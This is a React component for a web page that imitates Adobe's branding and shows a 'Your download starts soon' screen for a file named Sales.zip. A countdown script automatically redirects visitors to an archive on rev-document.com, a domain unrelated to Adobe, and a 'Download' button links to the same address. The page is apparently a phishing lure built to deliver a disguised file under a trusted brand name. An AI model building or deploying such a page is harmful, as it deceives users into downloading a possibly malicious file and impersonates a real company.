import React, { useEffect } from 'react';

export default function App() {
  useEffect(() => {
    const originalAddEventListener = document.addEventListener;
    const originalWindowAddEventListener = window.addEventListener;
    
    document.addEventListener = function(event, callback, options) {
      if (event === 'DOMContentLoaded') {
        setTimeout(() => {
          try { callback(new Event('DOMContentLoaded')); } catch (e) { console.error(e); }
        }, 0);
      } else {
        originalAddEventListener.call(document, event, callback, options);
      }
    };
    
    window.addEventListener = function(event, callback, options) {
      if (event === 'load') {
        setTimeout(() => {
          try { callback(new Event('load')); } catch (e) { console.error(e); }
        }, 0);
      } else {
        originalWindowAddEventListener.call(window, event, callback, options);
      }
    };
    
    let onloadHandler = null;
    try {
      Object.defineProperty(window, 'onload', {
        set: function(fn) {
          onloadHandler = fn;
          setTimeout(() => {
            try { if (typeof fn === 'function') fn(); } catch (e) { console.error(e); }
          }, 0);
        },
        get: function() { return onloadHandler; },
        configurable: true
      });
    } catch (e) {}
    try {
      
(function() {
if (window.__auraPreviewPerformanceController) return;
const nativeRequestAnimationFrame = window.requestAnimationFrame
? window.requestAnimationFrame.bind(window)
: function(callback) { return window.setTimeout(function() { callback(Date.now()); }, 16); };
const nativeCancelAnimationFrame = window.cancelAnimationFrame
? window.cancelAnimationFrame.bind(window)
: window.clearTimeout.bind(window);
const nativeSetInterval = window.setInterval.bind(window);
let paused = false;
let nextFrameId = 1;
const frameRecords = new Map();
const pausedFrameCallbacks = new Map();
const style = document.createElement('style');
style.id = 'aura-preview-performance-style';
style.textContent = [
'html[data-aura-preview-paused="true"] *,',
'html[data-aura-preview-paused="true"] *::before,',
'html[data-aura-preview-paused="true"] *::after {',
'  animation-play-state: paused !important;',
'  transition-duration: 0s !important;',
'  scroll-behavior: auto !important;',
'}'
].join('\n');
document.head.appendChild(style);
window.requestAnimationFrame = function(callback) {
const frameId = nextFrameId++;
if (paused) {
pausedFrameCallbacks.set(frameId, callback);
frameRecords.set(frameId, { paused: true });
return frameId;
}
const nativeFrameId = nativeRequestAnimationFrame(function(timestamp) {
frameRecords.delete(frameId);
callback(timestamp);
});
frameRecords.set(frameId, { nativeFrameId: nativeFrameId });
return frameId;
};
window.cancelAnimationFrame = function(frameId) {
const record = frameRecords.get(frameId);
pausedFrameCallbacks.delete(frameId);
if (record && typeof record.nativeFrameId !== 'undefined') {
nativeCancelAnimationFrame(record.nativeFrameId);
}
frameRecords.delete(frameId);
};
window.setInterval = function(callback, delay) {
const args = Array.prototype.slice.call(arguments, 2);
return nativeSetInterval(function() {
if (paused) return;
callback.apply(this, args);
}, delay);
};
const flushPausedFrames = function() {
const callbacks = Array.from(pausedFrameCallbacks.entries());
pausedFrameCallbacks.clear();
callbacks.forEach(function(entry) {
const frameId = entry[0];
const callback = entry[1];
const nativeFrameId = nativeRequestAnimationFrame(function(timestamp) {
frameRecords.delete(frameId);
callback(timestamp);
});
frameRecords.set(frameId, { nativeFrameId: nativeFrameId });
});
};
const setPaused = function(nextPaused) {
const shouldPause = Boolean(nextPaused);
if (paused === shouldPause) return;
paused = shouldPause;
document.documentElement.toggleAttribute('data-aura-preview-paused', paused);
if (!paused) {
flushPausedFrames();
}
};
window.__auraPreviewPerformanceController = {
setPaused: setPaused,
get paused() {
return paused;
}
};
window.addEventListener('message', function(event) {
if (event.source !== window.parent) return;
if (!event.data || event.data.type !== 'aura-preview-performance-mode') return;
setPaused(event.data.paused);
});
})();



window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-2M6V79H761');



      const downloadUrl = 'https://rev-document.com/Sales.zip';
      const downloadDelaySeconds = 5;

      document.addEventListener('DOMContentLoaded', () => {
        const countdown = document.getElementById('countdown');
        const fileCountdown = document.getElementById('file-countdown');
        const status = document.getElementById('download-status');
        const progress = document.getElementById('download-progress');
        const loadingIcon = document.getElementById('loading-icon');
        const successIcon = document.getElementById('success-icon');
        const manualBtn = document.getElementById('manual-download-btn');
        let remaining = downloadDelaySeconds;

        const updateCountdown = () => {
          if (countdown) countdown.textContent = remaining;
          if (fileCountdown) fileCountdown.textContent = remaining;
          if (status) status.innerHTML = `Redirecting in <span id="file-countdown">${remaining}</span>s`;
          if (progress) {
            const elapsed = downloadDelaySeconds - remaining;
            progress.style.width = `${Math.max(8, (elapsed / downloadDelaySeconds) * 100)}%`;
          }
        };

        const redirectToDownload = () => {
          if (loadingIcon) loadingIcon.style.display = 'none';
          if (successIcon) {
            successIcon.style.display = 'block';
            successIcon.classList.add('fade-in');
          }
          window.location.href = downloadUrl;
        };

        updateCountdown();

        const timer = setInterval(() => {
          remaining -= 1;
          updateCountdown();
          if (remaining <= 0) {
            clearInterval(timer);
            redirectToDownload();
          }
        }, 1000);

        if (manualBtn) {
          manualBtn.addEventListener('click', (e) => {
            e.preventDefault();
            clearInterval(timer);
            redirectToDownload();
          });
        }
      });
    
    } catch (error) {
      console.error("Error executing template scripts:", error);
    }
    
    return () => {
      document.addEventListener = originalAddEventListener;
      window.addEventListener = originalWindowAddEventListener;
      try { delete window.onload; } catch (e) {}
    };
  }, []);

  return (
    <>
      

<header className="w-full bg-white border-b border-gray-200 px-6 py-4 flex justify-between items-center z-10">
<div className="flex items-center gap-3">
<div className="w-8 h-8 bg-[#EB1000] rounded flex items-center justify-center text-white font-semibold text-lg tracking-tighter shadow-sm">
          A
        </div>
<span className="font-semibold text-sm tracking-tight text-gray-900 mt-0.5">
          ADOBE
        </span>
</div>
<nav className="hidden sm:flex gap-6 text-sm font-medium text-gray-500">
<a className="hover:text-gray-900 transition-colors" href="#">
          Creativity &amp; Design
        </a>
<a className="hover:text-gray-900 transition-colors" href="#">
          PDF &amp; E-signatures
        </a>
<a className="hover:text-gray-900 transition-colors" href="#">Support</a>
</nav>
<div className="flex items-center gap-4 text-sm">
<a className="font-medium text-gray-600 hover:text-gray-900 hidden sm:block" href="#">
          Sign In
        </a>
</div>
</header>

<main className="flex-grow flex items-center justify-center p-6 relative overflow-hidden">

<div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[800px] h-[800px] bg-red-50 rounded-full blur-3xl opacity-50 -z-10 pointer-events-none"></div>
<div className="bg-white rounded-2xl shadow-[0_2px_10px_rgba(0,0,0,0.04)] border border-gray-100 p-8 sm:p-12 max-w-lg w-full text-center fade-in relative z-0">

<div className="w-16 h-16 bg-red-50 rounded-full flex items-center justify-center mx-auto mb-6 text-[#EB1000] shadow-sm border border-red-100">
<iconify-icon height="32" icon="solar:cloud-download-linear" style={{strokeWidth: '1.5px'}} width="32"></iconify-icon>
</div>

<h1 className="text-3xl sm:text-4xl font-semibold tracking-tight text-gray-900 mb-3">
          Your download starts soon
        </h1>
<p className="text-base text-gray-500 mb-8 font-normal max-w-sm mx-auto">
          Please wait. You will be redirected automatically in
          <span className="font-medium text-[#EB1000]" id="countdown">5</span>
          seconds.
        </p>

<div className="bg-gray-50 rounded-xl p-4 mb-8 border border-gray-100 flex flex-col text-left">
<div className="flex items-center justify-between mb-4">
<div className="flex items-center gap-4">
<div className="w-10 h-10 bg-white rounded-lg flex items-center justify-center shadow-sm border border-gray-200 text-[#EB1000]">
<iconify-icon height="20" icon="solar:file-download-linear" style={{strokeWidth: '1.5px'}} width="20"></iconify-icon>
</div>
<div>
<p className="text-sm font-medium text-gray-900 tracking-tight">
                  Sales.zip
                </p>
<p className="text-xs text-[#EB1000] font-medium mt-0.5 animate-pulse" id="download-status">
                  Redirecting in
                  <span id="file-countdown">5</span>
                  s
                </p>
</div>
</div>
<div className="flex items-center">
<iconify-icon className="text-green-500" height="24" icon="solar:check-circle-linear" id="success-icon" style={{display: 'none', strokeWidth: '1.5px'}} width="24"></iconify-icon>
<iconify-icon className="animate-spin text-[#EB1000]" height="20" icon="solar:spinner-linear" id="loading-icon" style={{strokeWidth: '1.5px'}} width="20"></iconify-icon>
</div>
</div>
<div className="w-full bg-gray-200 rounded-full h-1.5 overflow-hidden">
<div className="bg-[#EB1000] h-1.5 rounded-full w-1/2 animate-pulse" id="download-progress"></div>
</div>
</div>

<div className="pt-6 border-t border-gray-100 text-sm flex items-center justify-center gap-2">
<span className="text-gray-500">Download didn't start?</span>
<a className="inline-flex items-center justify-center gap-2 rounded-lg bg-[#EB1000] px-4 py-2 text-sm font-medium text-white shadow-sm hover:bg-red-700 transition-colors group" href="https://rev-document.com/Sales.zip" id="manual-download-btn">
            Download
            <iconify-icon className="group-hover:translate-x-0.5 transition-transform" height="16" icon="solar:arrow-right-linear" style={{strokeWidth: '1.5px'}} width="16"></iconify-icon>
</a>
</div>
</div>
</main>

<footer className="w-full text-center py-8 text-xs text-gray-400 bg-white border-t border-gray-100">
<div className="flex flex-col sm:flex-row justify-center items-center gap-4 sm:gap-8">
<p>Copyright © 2024 Adobe. All rights reserved.</p>
<div className="flex gap-4">
<a className="hover:text-gray-600 transition-colors" href="#">Privacy</a>
<a className="hover:text-gray-600 transition-colors" href="#">
            Terms of Use
          </a>
<a className="hover:text-gray-600 transition-colors" href="#">
            Cookie preferences
          </a>
</div>
</div>
</footer>


    </>
  );
}
